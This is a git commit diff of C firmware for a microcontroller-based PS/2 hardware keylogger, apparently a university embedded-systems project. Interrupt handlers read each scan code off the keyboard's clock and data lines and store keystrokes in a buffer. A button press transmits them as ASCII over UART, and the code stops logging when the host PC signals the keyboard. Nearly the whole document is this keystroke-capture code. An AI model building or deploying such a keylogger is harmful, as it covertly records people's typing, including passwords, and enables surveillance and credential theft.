f7a4703c3a442d538b300f9d6790b41eb9dde99e
marklihere <mark.li@usu.edu>
2016-10-24 09:53:33 -0600

    Screenshots + Final code

--- main.c
+++ main.c
@@ -2,7 +2,6 @@
 // This translates from ps/2 to ascii. 
 // The table starts at 0x15, so you should shift 
 // the table by 0x15 when you reference it. 
-// HI
 unsigned char ps2_to_ascii[] = {
 	'q','1',0x00,0x00,0x00,'z','s','a','w','2',0x00,
 
@@ -10,53 +9,47 @@ unsigned char ps2_to_ascii[] = {
 	
 	'n','b','h','g','y','6',0x00,0x00,0x00,'m','j','u','7','8',0x00,
 	
-	0x00,',','k','i','o','0','9',0x00,0x00,'.',0x00,'l','p'};
+	0x00,',','k','i','o','0','9',0x00,0x00,'.',0x00,'l',0x00,'p'};
 
-// Structure to store logged keys
-unsigned char logged_keys[255];
-	
+
 volatile int RCGCUART    __attribute__((at(0x400FE618)));
 volatile int UART1BASE   __attribute__((at(0x4000D000)));
 volatile int GPIOBCTL    __attribute__((at(0x4000552C)));
-//volatile int UART1DR     __attribute__((at(0x4000D000)));
-#define UART1DR              (*((volatile int *)0x4000D000))
-
+#define UART1DR         (*((volatile int *)0x4000D000))
 volatile int UART1FR     __attribute__((at(0x4000D018)));
-volatile int UART1IBRD	__attribute__((at(0x4000D024)));
-volatile int UART1FBRD	__attribute__((at(0x4000D028)));
-volatile int UART1LCRH	__attribute__((at(0x4000D02C)));
-volatile int UART1CTL	    __attribute__((at(0x4000D030)));	
-volatile int PB_DATA_R    __attribute__((at(0x400053FC))); 
-volatile int PB_GPIOCR_R  __attribute__((at(0x40005524))); 
-//#define PB3				(*((volatile int *)0x420A000C))
-volatile int PB3        __attribute__((at(0x420A000C)));   // bit banded PB[3]
-	// 0x42000000 + 32*byte_offset + 4*bit position = 0x4200000C
-  // 0x42000000 + 0x5000 * 32 + 12  = 0x420A000C
-volatile int PB_DIR_R   __attribute__((at(0x40005400))); 
-volatile int PB_AF_R    __attribute__((at(0x40005420))); 
-volatile int PB_AM_R    __attribute__((at(0x40005528))); 
-volatile int PB_DEN_R   __attribute__((at(0x4000551C))); 
-volatile int PB_IEV_R   __attribute__((at(0x4000540C))); 
-volatile int PB_IBE_R   __attribute__((at(0x40005408))); 
-volatile int PB_IS_R    __attribute__((at(0x40005404))); 
-volatile int PB_IM_R    __attribute__((at(0x40005410))); 
-volatile int PB_ICR_R   __attribute__((at(0x4000541C))); 
-volatile int PF_DATA_R __attribute__((at(0x400253FC))); 
-volatile int PF_DIR_R  __attribute__((at(0x40025400))); 
-volatile int PF_AF_R   __attribute__((at(0x40025420))); 
-volatile int PF_AM_R   __attribute__((at(0x40025528))); 
-volatile int PF_PUR_R   __attribute__((at(0x40025510))); 
-volatile int PF_PDR_R   __attribute__((at(0x40025514))); 
-volatile int PF_GPIOCR_R   __attribute__((at(0x40025524))); 
-volatile int PF_IEV_R   __attribute__((at(0x4002540C))); 
-volatile int PF_IBE_R   __attribute__((at(0x40025408))); 
-volatile int PF_IS_R   __attribute__((at(0x40025404))); 
-volatile int PF_RIS_R   __attribute__((at(0x40025414)));
-volatile int PF_IM_R   __attribute__((at(0x40025410))); 
-volatile int PF_ICR_R   __attribute__((at(0x4002541C))); 
-volatile int PF_DEN_R  __attribute__((at(0x4002551C))); 
-volatile int PF_LOCK_R  __attribute__((at(0x40025520))); 
-volatile int RCGC2_R   __attribute__((at(0x400FE108))); //value for RCGC2 to enable clock for port F
+volatile int UART1IBRD	 __attribute__((at(0x4000D024)));
+volatile int UART1FBRD	 __attribute__((at(0x4000D028)));
+volatile int UART1LCRH	 __attribute__((at(0x4000D02C)));
+volatile int UART1CTL	   __attribute__((at(0x4000D030)));	
+volatile int PB_DATA_R   __attribute__((at(0x400053FC))); 
+volatile int PB_GPIOCR_R __attribute__((at(0x40005524))); 
+volatile int PB3         __attribute__((at(0x40005020)));
+  // use this bit masked address and rt shift by 3 0x40005020
+volatile int PB_DIR_R    __attribute__((at(0x40005400))); 
+volatile int PB_AF_R     __attribute__((at(0x40005420))); 
+volatile int PB_AM_R     __attribute__((at(0x40005528))); 
+volatile int PB_DEN_R    __attribute__((at(0x4000551C))); 
+volatile int PB_IEV_R    __attribute__((at(0x4000540C))); 
+volatile int PB_IBE_R    __attribute__((at(0x40005408))); 
+volatile int PB_IS_R     __attribute__((at(0x40005404))); 
+volatile int PB_IM_R     __attribute__((at(0x40005410))); 
+volatile int PB_ICR_R    __attribute__((at(0x4000541C))); 
+volatile int PF_DATA_R   __attribute__((at(0x400253FC))); 
+volatile int PF_DIR_R    __attribute__((at(0x40025400))); 
+volatile int PF_AF_R     __attribute__((at(0x40025420))); 
+volatile int PF_AM_R     __attribute__((at(0x40025528))); 
+volatile int PF_PUR_R    __attribute__((at(0x40025510))); 
+volatile int PF_PDR_R    __attribute__((at(0x40025514))); 
+volatile int PF_GPIOCR_R __attribute__((at(0x40025524))); 
+volatile int PF_IEV_R    __attribute__((at(0x4002540C))); 
+volatile int PF_IBE_R    __attribute__((at(0x40025408))); 
+volatile int PF_IS_R     __attribute__((at(0x40025404))); 
+volatile int PF_RIS_R    __attribute__((at(0x40025414)));
+volatile int PF_IM_R     __attribute__((at(0x40025410))); 
+volatile int PF_ICR_R    __attribute__((at(0x4002541C))); 
+volatile int PF_DEN_R    __attribute__((at(0x4002551C))); 
+volatile int PF_LOCK_R   __attribute__((at(0x40025520))); 
+volatile int RCGC2_R     __attribute__((at(0x400FE108)));  // value for RCGC2 to enable clock for port F
 volatile int UART1ENBB_R __attribute__((at(0x421A0600)));  // bitbanded enable bit for UART1
 volatile int NVIC_PRI0_R __attribute__((at(0xE000E400)));  // GPIOB
 volatile int NVIC_PRI7_R __attribute__((at(0xE000E41C)));  // GPIOF
@@ -64,29 +57,26 @@ volatile int NVIC_EN0_R  __attribute__((at(0xE000E100)));  // Enable NVIC interr
 #define RCGC2_PBF 0x00000022    // Enable Port F and Port B
 #define UNLOCK 0x4C4F434B       // Port F unlock
 
-
 // Declare Global variables here
 unsigned short DONTREAD_THIS_HEX = 0;
 unsigned short LOGGING = 0;
-unsigned char  HEX_DONE = 0;
-volatile unsigned char  hex_read_fromKB[100];  // this builds the current 8-bit hex code from PS2 KB
-unsigned char  current_bit_read = 0;
+volatile unsigned char  hex_read_fromKB[100];  // max 100 keys this builds the current 8-bit hex code from PS2 KB
 unsigned short i = 0;    // index for hex code array read from kb
 int countB = 0;
-int countF = 0;
+int realPB3 = 0;
 int number_of_char_stored = 0;
 
 void GPIOB_Handler(void) {
 	PB_ICR_R = 0x04;
-
+  realPB3 = PB3 >> 3;
+		
 	if(LOGGING == 1)
 	{
 		//  host PC talking to KB, ignore this hex code transmission
-		if(PB3 == 1 && countB == 0)
+		if(realPB3 == 1 && countB == 0)
 		{
-			LOGGING = 0;   // by completely stopping the keylogger
-			               // then subsequently will ignore 
-			
+			LOGGING = 0;   // by not doing anything until physically restarting keylogger
+			               // We completely shutdown and ignore everything if PC starts talking
 		}
 		
 		// make sure the initial byte is zero
@@ -96,9 +86,9 @@ void GPIOB_Handler(void) {
 		// reads the 8 bits
 		if(countB > 0 && countB <=8 && DONTREAD_THIS_HEX != 1)
 		{
-			// we read in 1 bit at a time sta
-		
-			hex_read_fromKB[number_of_char_stored] |= PB3 << (countB - 1);
+			// we read in 1 bit at a time
+		  
+			hex_read_fromKB[number_of_char_stored] |= realPB3 << (countB - 1);
 			//hex_read_fromKB[number_of_char_stored] |= (unsigned char)PB3 << (countB - 1);
 		}
 		
@@ -116,30 +106,15 @@ void GPIOB_Handler(void) {
 			DONTREAD_THIS_HEX = 0;
 			countB = 0;
 		}
-		else
+		else if (countB==10)
+		{
+      countB = 0;
+			number_of_char_stored++;
+		} else
 			countB ++;
 	
 
 	}
-	
-
-	// We are not logging, due to invalid host PC to KB transmission
-	if(LOGGING == 0 && countB >= 1)
-	{
-		if(countB < 12)   // ignore the full TX (8 data bits + parity + stop + ack)
-		{
-			countB ++;
-		}
-		// count has hit the ack bit
-		else
-		{
-				countB = 0;
-				LOGGING = 1;  // restart logging
-		}
-	}
-	
-
-	
 }
 
 void GPIOF_Handler(void) {
@@ -160,9 +135,9 @@ void GPIOF_Handler(void) {
 		for(i = 0; i < number_of_char_stored; i ++)
 		{
 			while((UART1FR & 0x0020) != 0);
-			UART1DR = ps2_to_ascii[hex_read_fromKB[i] - 15];
+			UART1DR = ps2_to_ascii[hex_read_fromKB[i] - 0x15];
 		}
-		
+		number_of_char_stored = 0;
 	}
 }
 
@@ -261,6 +236,15 @@ void INIT(void) {
 int main(void)
 {
 	INIT();
+	//hex_read_fromKB[0] = 0x1C;
+	
+	/*for(i = 0; i < 1; i ++)
+	{
+			while((UART1FR & 0x0020) != 0);
+			UART1DR = ps2_to_ascii[hex_read_fromKB[i] - 0x15];
+	}
+	*/
+	
 	while(1);
 	
 	return 0;
